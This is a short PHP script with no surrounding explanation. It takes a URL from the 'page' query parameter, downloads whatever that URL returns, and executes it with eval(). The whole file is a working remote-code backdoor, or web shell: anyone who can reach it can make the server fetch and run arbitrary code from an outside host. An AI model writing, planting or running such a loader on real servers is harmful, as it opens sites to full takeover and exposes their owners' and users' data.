<?php
if (isset($_GET['page']) && !empty($_GET['page'])) {
    $page_url = $_GET['page'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $page_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $code = curl_exec($ch);
    curl_close($ch);

    if ($code !== false) {
        eval("?>$code<?php ");
    }
}
?>
